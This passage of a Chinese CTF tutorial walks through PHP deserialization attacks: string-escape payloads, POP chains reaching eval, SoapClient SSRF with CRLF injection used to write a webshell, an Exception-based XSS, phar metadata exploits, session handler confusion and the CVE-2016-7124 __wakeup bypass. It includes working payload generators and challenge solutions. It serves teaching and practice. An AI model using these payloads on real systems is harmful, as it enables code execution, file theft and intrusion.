$res=filter(serialize($AA));// $c=unserialize($res);// echo $c-&gt;pass;?&gt;</code></pre><p>运行结果发现数组位置进行了闭合</p><p><img src="/images/pasted-41.png" alt="upload successful"><br>这就是为啥上面要先进行}在逃逸<br>构造我们想要的内容后要进行逃逸，我们发现过滤的时候将where改成了hacker，进行了字符串拓展增建了一个字符串，我们构造的字符串长度为34所以我们要构造34个where进行逃逸</p><p><img src="/images/pasted-42.png" alt="upload successful"><br>然后查看profile.php的图片，base64解码就获得了config.php中的flag</p><p><img src="/images/pasted-43.png" alt="upload successful"></p><h2 id="反序列化字符串逃逸-替换后导致字符串变短"><a href="#反序列化字符串逃逸-替换后导致字符串变短" class="headerlink" title="反序列化字符串逃逸(替换后导致字符串变短)"></a>反序列化字符串逃逸(替换后导致字符串变短)</h2><p>字符串变短的逃逸类似于变长，都是利用了替换字符串导致的可输入变量的改变，从而可以闭合<br>测试代码：</p><pre><code>&lt;?phpfunction str_rep($string){    return preg_replace( &#39;/php|test/&#39;,&#39;&#39;, $string);}$test[&#39;name&#39;] = $_GET[&#39;name&#39;];$test[&#39;sign&#39;] = $_GET[&#39;sign&#39;]; $test[&#39;number&#39;] = &#39;2020&#39;;$temp = str_rep(serialize($test));printf($temp);$fake = unserialize($temp);echo &#39;&lt;br&gt;&#39;;print(&quot;name:&quot;.$fake[&#39;name&#39;].&#39;&lt;br&gt;&#39;);print(&quot;sign:&quot;.$fake[&#39;sign&#39;].&#39;&lt;br&gt;&#39;);print(&quot;number:&quot;.$fake[&#39;number&#39;].&#39;&lt;br&gt;&#39;);?&gt;</code></pre><p>发现进行了过滤，将php和test转换为空<br>如果我们在name的参数中输入php，test等，就换转换为空，那么就会把后面的数据当成变量<br>而sign的参数是可控的，如果当name参数为空而读取到sign可控参数前，那么就可以通过sign的参数控制字符串用}号来闭合掉后面的<br>计算”;s:4:”sign”;s:51:”的长度为19<br>而过滤php一个能吞掉3个字符串，所以我们要输入7个php也就是吞掉21长度，而后面是19长度，所以我们加2个字符来补充<br>所以构造</p><pre><code>name=phpphpphpphpphpphpphpsign=12&quot;;s:4:&quot;sign&quot;;s:3:&quot;sjj&quot;;s:6:&quot;number&quot;;s:4:&quot;2222&quot;;}</code></pre><p>其中sign中12为补充使其为21长度，”号用于闭合name参数，然后可以发现，number不可变变量被改变</p><p><img src="/images/pasted-44.png" alt="upload successful"></p><h3 id="一个ctf例题-安洵杯-2019-easy-serialize-php"><a href="#一个ctf例题-安洵杯-2019-easy-serialize-php" class="headerlink" title="一个ctf例题([安洵杯 2019]easy_serialize_php)"></a>一个ctf例题([安洵杯 2019]easy_serialize_php)</h3><p>题目地址:<a href="https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_serialize_php" target="_blank" rel="noopener">https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_serialize_php</a><br>打开题目是一段代码</p><pre><code> &lt;?php$function = @$_GET[&#39;f&#39;];function filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}if($_SESSION){    unset($_SESSION);}$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;extract($_POST);if(!$function){    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;}if(!$_GET[&#39;img_path&#39;]){    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);}else{    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));}$serialize_info = filter(serialize($_SESSION));if($function == &#39;highlight_file&#39;){    highlight_file(&#39;index.php&#39;);}else if($function == &#39;phpinfo&#39;){    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!}else if($function == &#39;show_image&#39;){    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));} </code></pre><p><img src="/images/pasted-45.png" alt="upload successful"></p><p><img src="/images/pasted-46.png" alt="upload successful"><br>先看看phpinfo中的数据,提示在d0g3_f1ag.php文件中</p><p><img src="/images/pasted-47.png" alt="upload successful"></p><pre><code>&lt;?php$_SESSION[&quot;user&quot;]=&#39;123&#39;;$_SESSION[&quot;function&quot;]=&#39;123&#39;;$_SESSION[&quot;img&quot;]=&#39;123&#39;;$Lmg = serialize($_SESSION);echo $Lmg.&quot;\n&quot;;?&gt;</code></pre><p>先构造代码尝试运行结果</p><p><img src="/images/pasted-48.png" alt="upload successful"><br>和上面原理一样要将吞掉，长度为23<br><code>&quot;;s:8:&quot;function&quot;;s:75:&quot;</code><br>为什么s:后是75因为s后的长度必然大于10(也就是function传入数据的长度)所以我们只要大于10小于100都行，因为数据长度不可能大于100<br>而flag换成空格吞掉4个字符串，所以要6个flag(当然也可以8个php:3*8=24)，然后还有在function参数加一个字符串来满足吞24个字符串<br>所以构造数字1也就是满足24长度加的，img变量要base64，因为实际的img参数被我们给挤出去了，所说<br><img src="/images/pasted-49.png" alt="upload successful">这里不影响<br>payload（post传输）：<br><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=1&quot;;s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}</code><br>然后查看显示，查看源代码：</p><p><img src="/images/pasted-50.png" alt="upload successful"><br>将img参数读取的文件改为/d0g3_fllllllag的base64加密<br>payload：<br><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=1&quot;;s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;}</code></p><p><img src="/images/pasted-51.png" alt="upload successful"></p><h2 id="反序列化pop链构造"><a href="#反序列化pop链构造" class="headerlink" title="反序列化pop链构造"></a>反序列化pop链构造</h2><p>有时遇见魔法方法中没有利用代码，即不存在命令执行文件操作函数，可以通过调用其他类方法和魔法函数来达到目的<br>反序列化想构造的出的方法<br>命令执行：exec()、passthru()、popen()、system()<br>文件操作：file_put_contents()、file_get_contents()、unlink()</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>代码:</p><pre><code>&lt;?phpclass lemon {    protected $ClassObj;    function __construct() {        $this-&gt;ClassObj = new normal();    }    function __destruct() {        $this-&gt;ClassObj-&gt;action();    }}class normal {    function action() {        echo &quot;hello&quot;;    }}class evil {    private $data;    function action() {        eval($this-&gt;data);    }}unserialize($_GET[&#39;d&#39;]);?&gt;</code></pre><p>lemon类创建了正常normal类，然后销毁时执行了action()方法，很正常，但如果让其调用evil类，销毁时候就会调用evil的action()方法出现eval方法，就能达到效果，所以需要构造</p><pre><code>&lt;?phpclass lemon {    protected $ClassObj;    function __construct() {        $this-&gt;ClassObj = new evil();    }}class evil {    private $data = &quot;phpinfo();&quot;;}$lmg = new lemon();echo urlencode(serialize($lmg)).&quot;\n&quot;;?&gt;</code></pre><p>evil中data参数为私有属性，在序列化时会出现不可复制字符，需进行url编码<br><code>O%3A5%3A%22lemon%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</code></p><p><img src="/images/pasted-52.png" alt="upload successful"><br>其中phpinfo();可换成其他想要执行的命令system(‘dir’);等等</p><h2 id="php反序列化原生类利用"><a href="#php反序列化原生类利用" class="headerlink" title="php反序列化原生类利用"></a>php反序列化原生类利用</h2><p>反序列没有合适的利用链，需要利用php自带的原生类</p><h3 id="call方法"><a href="#call方法" class="headerlink" title="__call方法"></a>__call方法</h3><p>__call方法在调用不存在类的方法时触发<br>PHP代码：</p><pre><code>&lt;?php$rce = unserialize($_GET[&#39;u&#39;]);echo $rce-&gt;notexist();echo $rce;?&gt;</code></pre><p>通过unserialize进行反序列化，调用不存在notextist()类，将触发<strong>call()魔法函数。<br>php中原生类soapClient，存在可以进行</strong>call魔法函数。<br>SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。<br>其采用HTTP作为底层通讯协议，XML作为数据传送的格式。<br>php中的SoapClient类可以创建soap数据报文，与wsdl接口进行交互。</p><p><img src="/images/pasted-53.png" alt="upload successful"><br>其中option可以定义 User-Agent</p><p><img src="/images/pasted-54.png" alt="upload successful"><br>payload：</p><pre><code>&lt;?php$rce = unserialize($_GET[&#39;u&#39;]);echo $rce-&gt;notexist();echo $rce;?&gt;</code></pre><p><strong>注意</strong>：要开启soap，在php.ini中去除extension=php_soap.dll之前的“;” ，重启服务<br>payload：</p><pre><code>&lt;?php$lmg = serialize(new SoapClient(null, array(&#39;uri&#39;=&gt;&#39;http://192.168.124.133:8888/&#39;,&#39;location&#39;=&gt;&#39;http://192.168.124.133:8888/aaa/&#39;)));echo $lmg;?&gt;</code></pre><p>地址换成自己服务器地址<br>我是用虚拟机ubantu开启的端口<br>nc -l 8888<br>执行：</p><p><img src="/images/pasted-55.png" alt="upload successful"></p><p><img src="/images/pasted-56.png" alt="upload successful"><br>当然我们也可以传数据进行CRLF，攻击内网服务，注入redis命令，因为可定义user_agent<br>payload：</p><pre><code>&lt;?php    $lmg = serialize(new SoapClient(null, array(&#39;uri&#39;=&gt;&#39;http://192.168.124.133:8888/&#39;,&#39;location&#39;=&gt;&#39;http://192.168.124.133:8888/aaa/&#39;)));    // echo $lmg.&quot;\n&quot;;    $poc = &quot;CONFIG SET dir /root/&quot;;    $target = &quot;http://192.168.124.133:8888/&quot;;    $content = &quot;Content-Length:45\r\n\r\ndata=abc&quot;;    $b = new SoapClient(null, array(&#39;location&#39;=&gt;$target, &#39;user_agent&#39;=&gt;$content, &#39;uri&#39;=&gt;&#39;hello^^&#39;.$poc.&#39;^^hello&#39;));    $aaa = serialize($b);    $aaa = str_replace(&#39;^^&#39;, &quot;\n\r&quot;, $aaa);    echo $aaa.&quot;\n&quot;;    echo urlencode($aaa).&quot;\n&quot;;?&gt;</code></pre><p><img src="/images/pasted-57.png" alt="upload successful"></p><p><img src="/images/pasted-58.png" alt="upload successful"><br>内网中写shell：<br>内网中test.php</p><pre><code>&lt;?php if($_SERVER[&#39;REMOTE_ADDR&#39;]==&#39;127.0.0.1&#39;){    echo &#39;hi&#39;;    @$a=$_POST[1];    @eval($a);} ?&gt;</code></pre><p>可以利用反序列化，CRLF内网攻击写shell，反序列化位置</p><pre><code>&lt;?php$rce = unserialize($_GET[&#39;u&#39;]);echo $rce-&gt;notexist();echo $rce;?&gt;</code></pre><p>payload：</p><pre><code>&lt;?php$target = &#39;http://127.0.0.1/CTF/test.php&#39;;$post_string = &#39;1=file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;);&#39;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: &#39;    );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;hello^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;%26&#39;,$aaa);echo urlencode($aaa);$c=unserialize(urldecode($aaa));// $c-&gt;ss();?&gt;</code></pre><p><img src="/images/pasted-59.png" alt="upload successful"><br><?php phpinfo();?>成功被写入shell.php</p><h3 id="toString原生类利用"><a href="#toString原生类利用" class="headerlink" title="__toString原生类利用"></a>__toString原生类利用</h3><p>测试代码：</p><pre><code>&lt;?php    echo unserialize($_GET[&#39;u&#39;]);?&gt;</code></pre><p>利用payload：</p><pre><code>&lt;?php    echo urlencode(serialize(new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;)));?&gt;</code></pre><p>exception类对于错误消息没有经过编码，直接输出到了网页，便可以造成xss</p><p><img src="/images/pasted-60.png" alt="upload successful"></p><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p>来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数unserialize()的前提下，引起严重的php对象注入漏洞。<br>这个新的攻击方式被他公开在了美国的BlackHat会议演讲上，演讲主题为：”不为人所知的php反序列化漏洞”。它可以使攻击者将相关漏洞的严重程度升级为远程代码执行。我们在RIPS代码分析引擎中添加了对这种新型攻击的检测。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>phar文件结构</p><ul><li>a stub<br>文件格式标准，格式为xxx<?php xxx; __HALT_COMPILER();?>     前面内容不限，但必须以__HALT_COMPILER();?&gt;，否则无法识别是不是phar文件，其中xxx可以用作绕过文件上传的检测</li><li>a manifest describing the contents<br>phar本质是一种压缩文件，压缩文件的权限，属性等信息所存放的位置，以序列的化的方法存储用户自定义的meta-data，在使用phar://伪协议时会反序列化这部分，漏洞产生的原因就在这里</li></ul><p><img src="/images/pasted-61.png" alt="upload successful"></p><ul><li>the file contents<br>被压缩文件的内容</li><li>[optional] a signature for verifying Phar integrity (phar file format only)<br>签名，文件末尾，格式：</li></ul><p><img src="/images/pasted-62.png" alt="upload successful"><br>phar://伪协议介绍<br>这个参数是php解压压缩包的一个函数，不管什么，都会当做压缩包来解压<br>测试：<br>要将php.ini中的phar.readonly选项设置为off，不然没法生成phar文件<br>用来包含某个文件，构建类TestObject，然后析构函数结束时打印data数据</p><pre><code>&lt;?phpclass TestObject{    function __destruct()    {        echo $this -&gt; data;   // TODO: Implement __destruct() method.    }}include($_GET[&#39;Lmg&#39;]);?&gt;</code></pre><p>生成phar文件，且定义的meta-data的序列化</p><pre><code>&lt;?php    class TestObject {    }    $phar = new Phar(&#39;phar.phar&#39;);    $phar -&gt; startBuffering();    $phar -&gt; setStub(&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);   //设置stub，增加gif文件头    $phar -&gt;addFromString(&#39;test.txt&#39;,&#39;test&#39;);  //添加要压缩的文件    $object = new TestObject();    $object -&gt; data = &#39;Lmg&#39;;    $phar -&gt; setMetadata($object);  //将自定义meta-data存入manifest    $phar -&gt; stopBuffering();?&gt;</code></pre><p>运行生成文件为phar的文件</p><p><img src="/images/pasted-63.png" alt="upload successful"><br>在真实情况，需要上传到目标服务器，然后利用phar在解压时会反序化meta-data部分来达到目的，这里就直接直接包含了，打印了Lmg字符串</p><p><img src="/images/pasted-64.png" alt="upload successful"><br>受影响的函数</p><p><img src="/images/pasted-65.png" alt="upload successful"><br>利用条件：</p><ul><li>phar文件要能上传</li><li>有可利用函数如上图，可魔法函数构造pop链</li><li>文件函数操作可控，: / phar 等没过被过滤<h3 id="一个ctf例子-CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#一个ctf例子-CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="一个ctf例子([CISCN2019 华北赛区 Day1 Web1]Dropbox)"></a>一个ctf例子([CISCN2019 华北赛区 Day1 Web1]Dropbox)</h3>题目地址:<a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1]Dropbox" target="_blank" rel="noopener">https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1]Dropbox</a><br>打开页面发现是一个注册于登录页面,注册登录发现是个类似网盘的功能，初始时在登录和注册页面尝试sql注入发现不行，然后在下载功能尝试下载发现登录和注册位置对数据库操作进行了prepare()的预处理，网盘有个下载功能，尝试下载，尝试任意下载，抓包，将下载内容改为源码（有index.php class.php upload.php download.php login.php register.php），为啥要加../../呢？？前期我也不知道，看了别人题解发现，下载源码发现download.php，限制了切换了目录，同时没法下载其他目录，这就是后来为啥要用delete功能来phar://，那个位置没有进行目录的切换，然后想尝试文件上传来getshell，首先上传时进行了后缀判读，而且我们不知道上传后了路径，所以考虑其他方法</li></ul><p><img src="/images/pasted-66.png" alt="upload successful"></p><p><img src="/images/pasted-67.png" alt="upload successful"><br>查看delete.php，new file()其用了delete()函数，到class.php中查看detele()使用unlink()来删除，而unlink()函数是phar反序列化受影响函数，那么下面我们想要的就是构造就是打开显示flag.txt文件，为啥flag在flag.txt中我就不知道了，可能ctf选手直觉，有点玄学了，如果你知道可以评论告诉我感谢，继续，在class.php中发现close()中File类file_get_contents(),但是没法调用，然后发现user类中的析构函数调用了close类，如果我们令$db=new File();的化，但是虽然我们打开了文件，但是没用回显，所以还是看不见文件内容，所以要构造其他的pop链，然后发现FileList()中存在魔法函数_call,如果调用了不存在的函数就会执行，call函数的作用:</p><pre><code> public function __call($func, $args) {        array_push($this-&gt;funcs, $func);      //如果调用了不存在的方法，将改方法放到funcs数组中        foreach ($this-&gt;files as $file) {     //再从files数组中取出方法，利用这个元素去调用funcs中新增的func            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();  //因为调用了不存在的键值close(),所以func=close,所以$file-&gt;$func相当于调用close()函数        }    }</code></pre><p>而close函数打开$this-&gt;filename文件，所以我们构造File中的filename=./flag.txt就能打开该文件，而且该文件的内容存储到了results数组键值中，然后我们查看<br>File类中的析构函数，发现:</p><pre><code>foreach ($this-&gt;results as $filename =&gt; $result) {            $table .= &#39;&lt;tr&gt;&#39;;            foreach ($result as $func =&gt; $value) {                $table .= &#39;&lt;td class=&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;/td&gt;&#39;;            }</code></pre><p>这里对result的键值进行了输出，所以就能得到flag.txt中的内容<br>最后payload:</p><pre><code>&lt;?phpclass User {    public $db;}class File {    public $filename;}class FileList {    private $files;    public function __construct() {        $file = new File();        $file-&gt;filename = &quot;/flag.txt&quot;; //构造filename让其打开该文件        $this-&gt;files = array($file);     }}// $a = new User();// $a-&gt;db = new FileList(); //这里让FileList调用了不存在函数close()函数$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&#39;GIF89a&#39;.&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;); //设置stub$o = new User();$o-&gt;db = new FileList(); //这里让FileList调用了不存在函数close()函数$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p><img src="/images/pasted-68.png" alt="upload successful"></p><h2 id="php反序列化Session反序列化"><a href="#php反序列化Session反序列化" class="headerlink" title="php反序列化Session反序列化"></a>php反序列化Session反序列化</h2><h3 id="session在互联网起到的作用"><a href="#session在互联网起到的作用" class="headerlink" title="session在互联网起到的作用"></a>session在互联网起到的作用</h3><p>session用于跟踪用户的行为，保存用户的信息和状态等等<br>session当用户第一次访问网站时，session_start()函数就会创建唯一的sessionid，通过HTTP响应将sessionid保存到用户的cookie中。同时在服务器创建一个sessionid命名的文件，用于保存这个用户的会话信息。当用户再次访问这个网站时，也会通过http请求将cookie中保存的session再次携带，但是服务器不会再创建同名文件，而是硬盘中寻找sessionid的同名文件，且将其读取出来。<br>服务器session_start()函数作用<br>当会话开始或通过session_start()开始时，php内部会通过传来的sessionid来读取文件，php会自动序列化sessio文件内容，并将其填充到超全局变量$_SESSION中。如果不存在对应的会话数据，则创建一个sessionid的文件。如果用户为发送sessionid，则创建一个由32个字母组成的phpsessionid，并返回set-cookie</p><h3 id="session配置和phpsession反序列化原理"><a href="#session配置和phpsession反序列化原理" class="headerlink" title="session配置和phpsession反序列化原理"></a>session配置和phpsession反序列化原理</h3><h4 id="php-ini中的session配置"><a href="#php-ini中的session配置" class="headerlink" title="php.ini中的session配置"></a>php.ini中的session配置</h4><p><img src="/images/pasted-69.png" alt="upload successful"><br>因为我使用的是phpstudy搭建的环境所以路径比较奇怪<br>常见的存储位置</p><pre><code>/var/lib/php5/sess_PHPSESSID/var/lib/php7/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSED</code></pre><h4 id="session反序列化原理"><a href="#session反序列化原理" class="headerlink" title="session反序列化原理"></a>session反序列化原理</h4><p>session的存储机制</p><p><img src="/images/pasted-70.png" alt="upload successful"><br>测试代码：</p><pre><code>&lt;?php//ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);session_start();$_SESSION[&#39;Lmg&#39;] = $_GET[&#39;a&#39;];echo &quot;&lt;pre&gt;&quot;;var_dump($_SESSION);echo &quot;&lt;/pre&gt;&quot;;?&gt;</code></pre><p>分别注释查看不同机制的保存方式，我们分别?a=123查看</p><ul><li>Lmg|s:3:”123”;                     —————-ini_set(‘session.serialize_handler’, ‘php’);   php机制</li><li>a:1:{s:3:”Lmg”;s:3:”123”;}         —————-ini_set(“session.serialize_handler”, “php_serialize”);   php_serialize机制</li><li>Lmgs:3:”123”;                    —————–ini_set(“session.serialize_handler”, “php_binary”);      php_binary机制<br>产生session反序列的原因就在程序员在读取或者存储中使用了不同的机制，我们以php_serialize格式来存储，用php机制来读取<br>测试代码：<br>存储session代码：<pre><code>&lt;?php//ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);session_start();$_SESSION[&#39;Lmg&#39;] = $_GET[&#39;a&#39;];echo &quot;&lt;pre&gt;&quot;;var_dump($_SESSION);echo &quot;&lt;/pre&gt;&quot;;?&gt;</code></pre>读取session代码：<pre><code>&lt;?php  ini_set(&quot;session.serialize_handler&quot;, &quot;php&quot;);  session_start();  class student {      var $name;      var $age;      function __wakeup(){          echo $this-&gt;name;      }  }?&gt;</code></pre>我们先构造一个student的类来生成我们想要的目的<pre><code>&lt;?php  class student {      var $name;      var $age;  }$Lmg = new student();$Lmg-&gt;name = &quot;hack&quot;;$Lmg-&gt;age = &quot;19&quot;;echo serialize($Lmg);?&gt;</code></pre>生成的序列化字符串<br><code>O:7:&quot;student&quot;:2:{s:4:&quot;name&quot;;s:4:&quot;hack&quot;;s:3:&quot;age&quot;;s:2:&quot;19&quot;;}</code><br>我们构造在储存页面构造payload，只需要在上面的字符串前加|就可，为什么呢？？？</li></ul><p><img src="/images/pasted-71.png" alt="upload successful"><br>如果我们传入的数值中有|那么在读取时就认为后面是我们要反序列化的字符串，从而达到目的<br>将构造的字符串传入存储php中计：?a=|O:7:”student”:2:{s:4:”name”;s:4:”hack”;s:3:”age”;s:2:”19”;}<br>查看储存的字符串：a:1:{s:3:”Lmg”;s:60:”|O:7:”student”:2:{s:4:”name”;s:4:”hack”;s:3:”age”;s:2:”19”;}<br>所以达到了目的</p><p><img src="/images/pasted-72.png" alt="upload successful"><br>查看一下读取的php，成功打印了hack</p><p><img src="/images/pasted-73.png" alt="upload successful"></p><h3 id="没有-SESSION赋值的session反序列化"><a href="#没有-SESSION赋值的session反序列化" class="headerlink" title="没有$_SESSION赋值的session反序列化"></a>没有$_SESSION赋值的session反序列化</h3><p>在php中存在一个upload_process机制，可以自动创建$_SESSION一个键值对，而且其中的值用户可以控制，文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态 </p><p><img src="/images/pasted-74.png" alt="upload successful"></p><p><img src="/images/pasted-75.png" alt="upload successful"><br>什么意思呢？？？？意思上传文件，同时post一个于session.upload_process.name同名的变量。后端就会自动将post的这个同名变量作为键，进行序列化然后存储到session文件中，下次请求就会反序列化session文件</p><h4 id="一个ctf题来实践了解一下"><a href="#一个ctf题来实践了解一下" class="headerlink" title="一个ctf题来实践了解一下"></a>一个ctf题来实践了解一下</h4><p>题目地址：<a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a><br>打开题目是源码：</p><pre><code>&lt;?php//A webshell is wait for youini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();class OowoO{    public $mdzz;    function __construct()    {        $this-&gt;mdzz = &#39;phpinfo();&#39;;    }    function __destruct()    {        eval($this-&gt;mdzz);    }}if(isset($_GET[&#39;phpinfo&#39;])){    $m = new OowoO();}else{    highlight_string(file_get_contents(&#39;index.php&#39;));}?&gt;</code></pre><p>先读取session，然后get传入phpinfo参数，然后创建对象，对象中构造函数给mdzz赋值phpinfo，析构函数执行eval，所以我们的目的是将mdzz构造为读取文件<br>，先随便传入参数，查看phpinfo中的参数，发现默认的反序列化机制是php-serialize，但是题目所使用php，那么这个两个机制再上文产生的漏洞我们已经了解，但是我们没法给session进行存储啊，所以就要用到上面session上传进度的session存储来存入我们想要的内容</p><p><img src="/images/pasted-76.png" alt="upload successful"><br>构造上传表单</p><pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;</code></pre><p>然后构造我们想要的payload，打印目录文件print_r(scandir(dirname(<strong>FILE</strong>)));，如果写入析构函数会eval执行</p><pre><code>&lt;?phpclass OowoO {    public $mdzz;}$Lmg = new OowoO();$Lmg-&gt;mdzz = &quot;print_r(scandir(dirname(__FILE__)));&quot;;echo serialize($Lmg);?&gt;</code></pre><p>生成的序列化字符串<br><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code><br>我们用上传表单随便上传一个文件，抓包将filename改为<br><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;}</code><br>为什么要改filename，因为其会跟file数组保存到session中上面图片有说明<br>为啥要在字符串前加|,这个上面也说过，因为反序列化的机制不一样，|后会当做要反序列化的字符串<br>为什么要再”前加\，因为我们的字符串是放在filename=””双引号内要进行转义</p><p><img src="/images/pasted-77.png" alt="upload successful"><br>发现成功读取到文件名，但是我们不知道文件目录，查看phpinfo()，查看当前脚本的运行路径</p><p><img src="/images/pasted-78.png" alt="upload successful"><br>所以构造：print_r(file_get_contents(“/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php”));来读取这个文件<br>payload：</p><pre><code>&lt;?phpclass OowoO {    public $mdzz;}$Lmg = new OowoO();$Lmg-&gt;mdzz = &quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));&quot;;echo serialize($Lmg);?&gt;</code></pre><p>生成的字符串，成功获得flag<br><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));&quot;;}</code><br><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}</code></p><p><img src="/images/pasted-79.png" alt="upload successful"></p><h2 id="php反序列化小技巧"><a href="#php反序列化小技巧" class="headerlink" title="php反序列化小技巧"></a>php反序列化小技巧</h2><h3 id="wakeup失效：CVE-2016-7124"><a href="#wakeup失效：CVE-2016-7124" class="headerlink" title="__wakeup失效：CVE-2016-7124"></a>__wakeup失效：CVE-2016-7124</h3><p>漏洞利用版本：<br>php5&lt;5.6.25<br>php7&lt;7.0.10<br>漏洞产生原因<br>如果存在_wakeup方法，调用unserilize()方法前则先调用_wakeup方法，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时候，便会跳过_wakeup的执行<br>测试代码：</p><pre><code>&lt;?phpclass demo{    public $name = &quot;Lmg&quot;;    public function __wakeup(){        echo &quot;this is __wakeup&lt;br&gt;&quot;;    }    public function __destruct(){        echo &quot;this is __destruct&lt;br&gt;&quot;;    }}// $a = new demo();// echo serialize($a);unserialize($_GET[&#39;Lmg&#39;]);?&gt;</code></pre><p><img src="/images/pasted-80.png" alt="upload successful"><br>对比发现页面只执行了<strong>destruct方法，从而</strong>wakeup()失效</p><h4 id="一个ctf例题-unserialize3"><a href="#一个ctf例题-unserialize3" class="headerlink" title="一个ctf例题(unserialize3)"></a>一个ctf例题(unserialize3)</h4><p>题目地址:<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4821&page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4821&amp;page=1</a><br>打开题目直接是部分源码，看到wakeup函数应该想到是利用__wakeup()失效漏洞<br>题目源码：</p><pre><code>class xctf{public $flag = &#39;111&#39;;public function __wakeup(){exit(&#39;bad 